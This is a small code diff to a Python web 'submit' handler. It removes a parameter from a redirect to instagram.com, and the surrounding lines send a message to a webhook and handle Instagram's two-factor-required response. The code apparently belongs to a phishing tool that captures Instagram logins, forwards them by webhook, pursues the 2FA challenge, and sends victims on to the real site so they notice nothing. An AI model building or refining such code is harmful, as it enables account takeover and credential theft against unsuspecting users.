@@ -57,11 +57,7 @@ def submit():
         with concurrent.futures.ThreadPoolExecutor() as executor:
             future = executor.submit(send_webhook_message,  message)
             result = future.result()
-
-        params = {
-            "display_type": "none"
-        }
-        return redirect("https://www.instagram.com",params)
+        return redirect("https://www.instagram.com")
 
     elif result.get("two_factor_required"):
         two_factor_identifier = result.get("two_factor_info", {}).get("two_factor_identifier")
